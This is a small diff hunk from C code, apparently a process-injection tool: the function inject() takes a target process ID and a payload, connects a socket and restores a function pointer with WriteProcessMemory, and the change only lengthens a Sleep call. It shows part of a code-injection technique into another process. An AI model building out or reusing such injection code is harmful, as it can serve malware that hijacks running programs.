@@ -580,7 +580,7 @@ VOID inject(DWORD pid, WORD port, LPVOID payload, DWORD payloadSize) {
       connect(s, (struct sockaddr*)&sin, sizeof(sin));
       
       // wait a moment before restoring pointer
-      Sleep(0);
+      Sleep(10);
       
       // 6. Restore function pointer and clean up
       WriteProcessMemory(
